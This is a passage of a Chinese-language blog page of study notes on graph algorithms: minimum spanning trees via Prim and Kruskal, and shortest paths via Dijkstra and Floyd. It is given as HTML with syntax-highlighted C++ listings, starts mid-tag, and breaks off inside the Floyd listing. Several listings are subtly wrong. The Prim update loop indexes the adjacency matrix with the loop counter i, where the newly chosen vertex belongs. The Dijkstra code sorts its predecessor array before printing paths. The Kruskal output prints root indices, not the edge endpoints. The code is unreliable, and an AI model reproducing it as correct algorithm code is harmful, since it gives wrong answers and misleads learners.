src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/BFS%E7%9A%84%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87.png"></p><h4 id="两种算法的比较"><a href="#两种算法的比较" class="headerlink" title="两种算法的比较"></a>两种算法的比较</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/BFS%E5%92%8CDFS%E7%9A%84%E7%AE%97%E6%B3%95%E6%95%88%E7%9B%8A%E6%AF%94%E8%BE%83.png"></p><h2 id="图的应用"><a href="#图的应用" class="headerlink" title="图的应用"></a>图的应用</h2><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><ol><li><p>概念回顾</p><ul><li><p>生成树</p><p>所有的顶点，均有边连接起来，不存在回路；也就是全部顶点，部分边</p></li></ul></li><li><p>最小生成树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91.png"></p></li><li><p>构造最小数生成树</p><ul><li><p>MST性质：设N&#x3D;(V,E)是一个连通的网，存在一个U是顶点集V的非空子集。若边（u,v）是一条具有最小权值的边，其中u包含于U,v包含于V，则一定存在一个最小生成树，包含边（u,v）</p></li><li><p><code>prim</code>普利姆算法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/prim%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E7%AE%97%E6%B3%95.png"></p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>      <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>      <br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>      <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>      <br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatemMinimalSpanningTree</span><span class="hljs-params">(AMGraph &amp;amGraph)</span> </span>&#123;<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-type">int</span> minSub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> minWeight;<br>    <span class="hljs-type">int</span> weight[MVNum]&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> correlativeSub[MVNum]&#123;<span class="hljs-number">0</span>&#125;;<br>      <br>    <span class="hljs-comment">//将第一个点的相关的权值记录下来</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        weight[i] = amGraph.arcs[minSub][i];<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;the begin point is: &quot;</span> &lt;&lt; amGraph.vexs[minSub] &lt;&lt; std::endl;<br>      <br>    <span class="hljs-comment">//最小生成树</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        minWeight = MaxInt;<br>      <br>        <span class="hljs-comment">//找到最小的值和权值，记录这个点,更新minWeight</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (weight[j] &lt; minWeight &amp;&amp; weight[j] != <span class="hljs-number">0</span>) &#123;<br>                minWeight = weight[j];<br>                minSub = j;<br>            &#125;<br>        &#125;<br>      <br>      <br>        std::cout &lt;&lt; <span class="hljs-string">&quot;( &quot;</span> &lt;&lt; amGraph.vexs[correlativeSub[minSub]] &lt;&lt; <span class="hljs-string">&quot;  &quot;</span> &lt;&lt; amGraph.vexs[minSub] &lt;&lt; <span class="hljs-string">&quot; )   point is： &quot;</span><br>                  &lt;&lt; amGraph.vexs[minSub] &lt;&lt; <span class="hljs-string">&quot;   weight is: &quot;</span> &lt;&lt; minWeight &lt;&lt; std::endl;<br>        weight[minSub] = <span class="hljs-number">0</span>;<span class="hljs-comment">//防止再次调用</span><br>      <br>        <span class="hljs-comment">//更新weight[]</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (weight[j] &gt; amGraph.arcs[i][j] &amp;&amp; weight[j] != <span class="hljs-number">0</span>) &#123;<br>                weight[j] = amGraph.arcs[i][j];<br>                correlativeSub[j] = minSub;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> nodeNum;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;input your nodeNum: &quot;</span>;<br>    std::cin &gt;&gt; nodeNum;<br>    AMGraph amGraph&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, nodeNum);<br>    <span class="hljs-comment">//实现最小生树</span><br>    <span class="hljs-built_in">CreatemMinimalSpanningTree</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>      <br></code></pre></td></tr></table></figure></li><li><p>克鲁斯卡尔算法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%85%8B%E9%B2%81%E6%96%AF%E5%8D%A1%E5%B0%94%E7%AE%97%E6%B3%95.png"></p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>      <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>      <br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>      <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Edge</span> &#123;<br>    <span class="hljs-type">int</span> begin;<br>    <span class="hljs-type">int</span> end;<br>    <span class="hljs-type">int</span> weight;<br>&#125;;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GetEdges</span><span class="hljs-params">(AMGraph &amp;amGraph, std::vector&lt;Edge&gt; &amp;edges)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            Edge edge;<br>            edge.begin = i;<br>            edge.end = j;<br>            edge.weight = amGraph.arcs[i][j];<br>            edges.<span class="hljs-built_in">emplace_back</span>(edge);<br>        &#125;<br>    &#125;<br>      <br>    std::<span class="hljs-built_in">sort</span>(edges.<span class="hljs-built_in">begin</span>(), edges.<span class="hljs-built_in">end</span>(), [](Edge a, Edge b) &#123;<br>        <span class="hljs-keyword">return</span> a.weight &lt; b.weight;<br>    &#125;);<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt; &amp;sub, <span class="hljs-type">int</span> begin)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (sub[begin] &gt; <span class="hljs-number">0</span>) &#123;<br>        begin = sub[begin];<span class="hljs-comment">//找到是否连成了闭环</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> begin;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateMinimalSpanningTree</span><span class="hljs-params">(AMGraph &amp;amGraph)</span> </span>&#123;<br>    std::vector&lt;Edge&gt; edges;<br>    <span class="hljs-built_in">GetEdges</span>(amGraph, edges);<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(amGraph.vexnum, <span class="hljs-number">0</span>)</span></span>;<br>      <br>    <span class="hljs-type">int</span> beginSub, endSub;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item: edges) &#123;<br>        beginSub = <span class="hljs-built_in">find</span>(sub, item.begin);<br>        endSub = <span class="hljs-built_in">find</span>(sub, item.end);<br>        <span class="hljs-keyword">if</span> (beginSub != endSub) &#123;<br>            sub[beginSub]=endSub;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;( &quot;</span> &lt;&lt; beginSub &lt;&lt; <span class="hljs-string">&quot;  &quot;</span> &lt;&lt; endSub &lt;&lt; <span class="hljs-string">&quot; )   &quot;</span> &lt;&lt; amGraph.vexs[beginSub] &lt;&lt; <span class="hljs-string">&quot; --&gt; &quot;</span><br>                      &lt;&lt; amGraph.vexs[endSub] &lt;&lt; <span class="hljs-string">&quot;  weight: &quot;</span>&lt;&lt;item.weight&lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br>       <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> nodeNum;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;input your nodeNum: &quot;</span>;<br>    std::cin &gt;&gt; nodeNum;<br>    AMGraph amGraph&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, nodeNum);<br>    <span class="hljs-comment">//实现最小生树</span><br>    <span class="hljs-built_in">CreateMinimalSpanningTree</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>      <br></code></pre></td></tr></table></figure><p>最小生成树，不一定唯一</p></li></ul></li></ol><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><ul><li><p>迪杰斯特拉算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>  <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>  <br>  <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatePairShortPath</span><span class="hljs-params">(AMGraph amGraph)</span> </span>&#123;<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(amGraph.vexnum)</span></span>;    <span class="hljs-comment">//该点对应最短路径的前驱</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weight</span><span class="hljs-params">(amGraph.vexnum)</span></span>; <span class="hljs-comment">//从最开始的点到各个点的路径</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">final</span><span class="hljs-params">(amGraph.vexnum)</span></span>;  <span class="hljs-comment">//存放是否遍历</span><br>  <br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        weight[i] = amGraph.arcs[<span class="hljs-number">0</span>][i];;<br>        sub[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">final</span>[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//针对第一个点</span><br>    weight[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">final</span>[<span class="hljs-number">0</span>] = <span class="hljs-literal">true</span>;<br>  <br>    <span class="hljs-type">int</span> min = MaxInt;<br>    <span class="hljs-type">int</span> minSub = <span class="hljs-number">0</span>;<span class="hljs-comment">//存放临时的最小的路径</span><br>    <span class="hljs-comment">//最短路径</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        min = MaxInt;<br>        <span class="hljs-comment">//找到到旁边一个点最近的路径</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (min &gt; weight[j] &amp;&amp; !<span class="hljs-keyword">final</span>[j]) &#123;<br>                min = weight[j];<br>                minSub = j;<br>            &#125;<br>        &#125;<br>  <br>        <span class="hljs-keyword">final</span>[minSub] = <span class="hljs-literal">true</span>;<br>  <br>        <span class="hljs-comment">//测试3个节点的关系</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (min + amGraph.arcs[minSub][j] &lt; weight[j] &amp;&amp; !<span class="hljs-keyword">final</span>[j]) &#123;<br>                weight[j] = min + amGraph.arcs[minSub][j];<br>                sub[j] = minSub;<br>            &#125;<br>        &#125;<br>  <br>    &#125;<br>  <br>  <br>    std::<span class="hljs-built_in">sort</span>(sub.<span class="hljs-built_in">begin</span>(), sub.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123;<br>        <span class="hljs-keyword">return</span> a &lt; b;<br>    &#125;);<br>  <br>    std::cout&lt;&lt;<span class="hljs-string">&quot;\n\nthe shortest path:&quot;</span>&lt;&lt;std::endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        std::cout &lt;&lt; amGraph.vexs[sub[i]] &lt;&lt; <span class="hljs-string">&quot; --&gt; &quot;</span> &lt;&lt; amGraph.vexs[i] &lt;&lt; <span class="hljs-string">&quot;   now, the weight is: &quot;</span> &lt;&lt; weight[i]&lt;&lt;std::endl;<br>    &#125;<br>  <br>&#125;<br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;<br>    <span class="hljs-type">int</span> size;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;please input size: &quot;</span>;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreatePairShortPath</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>弗洛伊德</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 